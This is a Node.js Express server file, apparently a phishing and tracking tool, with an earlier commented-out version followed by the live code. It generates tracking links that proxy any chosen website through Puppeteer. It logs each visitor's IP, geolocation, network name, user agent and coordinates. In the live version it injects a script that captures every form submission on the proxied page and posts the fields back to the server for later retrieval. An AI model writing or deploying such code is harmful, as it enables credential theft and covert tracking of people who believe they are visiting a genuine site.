// const express = require('express');
// const bodyParser = require('body-parser');
// const { v4: uuidv4 } = require('uuid');
// const puppeteer = require('puppeteer');
// const requestIp = require('request-ip');
// const geoip = require('geoip-lite');
// const dns = require('dns');
// const app = express();
// const port = 3000;

// let urlDatabase = {};
// let visitLogs = {};

// // Middleware to parse JSON
// app.use(bodyParser.json());
// app.use(bodyParser.urlencoded({ extended: true }));

// // Middleware to allow CORS
// app.use((req, res, next) => {
//     res.header('Access-Control-Allow-Origin', '*');
//     res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
//     next();
// });

// // Middleware to get client IP and geo-location
// app.use((req, res, next) => {
//     const clientIp = requestIp.getClientIp(req);
//     const geo = geoip.lookup(clientIp);
//     req.clientInfo = { ip: clientIp, geo: geo };
//     next();
// });

// // Function to get the network name (reverse DNS lookup)
// function getNetworkName(ip) {
//     return new Promise((resolve, reject) => {
//         dns.reverse(ip, (err, hostnames) => {
//             if (err) return resolve("N/A");
//             resolve(hostnames[0] || "N/A");
//         });
//     });
// }

// // Endpoint to generate a tracking link
// app.post('/generate', (req, res) => {
//     const originalUrl = req.body.url;
//     const id = uuidv4();
//     urlDatabase[id] = originalUrl;
//     visitLogs[id] = [];
//     res.send({ trackingLink: `http://localhost:${port}/track/${id}` });
// });

// // Endpoint to serve the original URL content using Puppeteer and log visit
// app.get('/track/:id', async (req, res) => {
//     const id = req.params.id;
//     const originalUrl = urlDatabase[id];
//     if (!originalUrl) {
//         return res.status(404).send('Not found');
//     }
//     try {
//         const networkName = await getNetworkName(req.clientInfo.ip);

//         // Log visit
//         visitLogs[id].push({
//             timestamp: new Date(),
//             ip: req.clientInfo.ip,
//             geo: req.clientInfo.geo,
//             userAgent: req.headers['user-agent'],
//             latitude: req.query.latitude,
//             longitude: req.query.longitude,
//             networkName: networkName,
//             formData: req.query // log any form data passed as query params
//         });

//         // Log form data to terminal
//         console.log(`Form Data from visit to ${originalUrl}:`, req.query);

//         // Fetch content using Puppeteer
//         const browser = await puppeteer.launch();
//         const page = await browser.newPage();
//         await page.goto(originalUrl, { waitUntil: 'networkidle2' });
//         const content = await page.content();
//         await browser.close();
//         res.send(content);
//     } catch (error) {
//         console.error('Error fetching the URL:', error.message);
//         res.status(500).send('Error fetching the URL');
//     }
// });

// // Endpoint to retrieve visit logs
// app.get('/logs/:id', (req, res) => {
//     const id = req.params.id;
//     if (!visitLogs[id]) {
//         return res.status(404).send('Not found');
//     }
//     res.send(visitLogs[id]);
// });

// // Endpoint to log form data
// app.post('/logformdata/:id', async (req, res) => {
//     const id = req.params.id;
//     if (!visitLogs[id]) {
//         return res.status(404).send('Not found');
//     }
//     const networkName = await getNetworkName(req.clientInfo.ip);
//     visitLogs[id].push({
//         timestamp: new Date(),
//         ip: req.clientInfo.ip,
//         geo: req.clientInfo.geo,
//         userAgent: req.headers['user-agent'],
//         latitude: req.body.latitude,
//         longitude: req.body.longitude,
//         networkName: networkName,
//         formData: req.body
//     });

//     // Log form data to terminal
//     console.log(`Form Data from ${id}:`, req.body);

//     res.send({ success: true, formData: req.body });
// });

// app.listen(port, () => {
//     console.log(`Server running at http://localhost:${port}`);
// });




const express = require('express');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const puppeteer = require('puppeteer');
const requestIp = require('request-ip');
const geoip = require('geoip-lite');
const dns = require('dns');
const app = express();
const port = 3000;

let urlDatabase = {};
let visitLogs = {};

// Middleware to parse JSON
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Middleware to allow CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Middleware to get client IP and geo-location
app.use((req, res, next) => {
    const clientIp = requestIp.getClientIp(req);
    const geo = geoip.lookup(clientIp);
    req.clientInfo = { ip: clientIp, geo: geo };
    next();
});

// Function to get the network name (reverse DNS lookup)
function getNetworkName(ip) {
    return new Promise((resolve, reject) => {
        dns.reverse(ip, (err, hostnames) => {
            if (err) return resolve("N/A");
            resolve(hostnames[0] || "N/A");
        });
    });
}

// Endpoint to generate a tracking link
app.post('/generate', (req, res) => {
    const originalUrl = req.body.url;
    const id = uuidv4();
    urlDatabase[id] = originalUrl;
    visitLogs[id] = [];
    res.send({ trackingLink: `http://localhost:${port}/track/${id}` });
});

// Endpoint to serve the original URL content using Puppeteer and log visit
app.get('/track/:id', async (req, res) => {
    const id = req.params.id;
    const originalUrl = urlDatabase[id];
    if (!originalUrl) {
        return res.status(404).send('Not found');
    }
    try {
        const networkName = await getNetworkName(req.clientInfo.ip);

        // Log visit
        visitLogs[id].push({
            timestamp: new Date(),
            ip: req.clientInfo.ip,
            geo: req.clientInfo.geo,
            userAgent: req.headers['user-agent'],
            latitude: req.query.latitude,
            longitude: req.query.longitude,
            networkName: networkName,
            formData: req.query // log any form data passed as query params
        });

        // Log form data to terminal
        console.log(`Form Data from visit to ${originalUrl}:`, req.query);

        // Fetch content using Puppeteer
        const browser = await puppeteer.launch();
        const page = await browser.newPage();

        await page.goto(originalUrl, { waitUntil: 'networkidle2' });

        // Inject a script to capture form submissions
        await page.evaluate((id) => {
            const script = document.createElement('script');
            script.type = 'text/javascript';
            script.innerHTML = `
                document.addEventListener('submit', function(event) {
                    const form = event.target;
                    const formData = new FormData(form);
                    const data = {};
                    formData.forEach((value, key) => { data[key] = value; });

                    fetch('http://localhost:3000/logformdata/${id}', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    });
                });
            `;
            document.body.appendChild(script);
        }, id);

        const content = await page.content();
        await browser.close();
        res.send(content);
    } catch (error) {
        console.error('Error fetching the URL:', error.message);
        res.status(500).send('Error fetching the URL');
    }
});

// Endpoint to retrieve visit logs
app.get('/logs/:id', (req, res) => {
    const id = req.params.id;
    if (!visitLogs[id]) {
        return res.status(404).send('Not found');
    }
    res.send(visitLogs[id]);
});

// Endpoint to log form data
app.post('/logformdata/:id', async (req, res) => {
    const id = req.params.id;
    if (!visitLogs[id]) {
        return res.status(404).send('Not found');
    }
    const networkName = await getNetworkName(req.clientInfo.ip);
    visitLogs[id].push({
        timestamp: new Date(),
        ip: req.clientInfo.ip,
        geo: req.clientInfo.geo,
        userAgent: req.headers['user-agent'],
        latitude: req.body.latitude,
        longitude: req.body.longitude,
        networkName: networkName,
        formData: req.body
    });

    // Log form data to terminal
    console.log(`Form Data from ${id}:`, req.body);

    res.send({ success: true, formData: req.body });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});





